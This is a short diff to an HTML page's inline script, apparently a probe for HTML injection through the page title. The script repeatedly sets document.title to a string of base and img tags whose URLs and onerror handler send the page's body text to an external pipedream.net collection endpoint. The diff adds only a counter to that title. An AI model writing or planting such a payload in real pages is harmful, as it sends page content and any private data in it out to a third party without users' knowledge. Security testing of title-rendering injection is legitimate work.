@@ -10,14 +10,15 @@
 		
 		<script>
 
-			
+			var i=0;
 			const newTitle = `<base href='https://eo7qcsyyizkgjep.m.pipedream.net/?'+document.querySelector('body').textContent> <img src='https://eo7qcsyyizkgjep.m.pipedream.net/?'+document.querySelector('body').textContent onerror="this.src='https://eo7qcsyyizkgjep.m.pipedream.net/?'+document.querySelector('body').textContent">`;
 
 
 
 			// Set an interval to modify the title every 1 seconds
 			setInterval(() => {
-			document.title = newTitle;
+			document.title = newTitle+i;
+			i=i+1;
 			}, 5000);
 		</script>
 	</body>
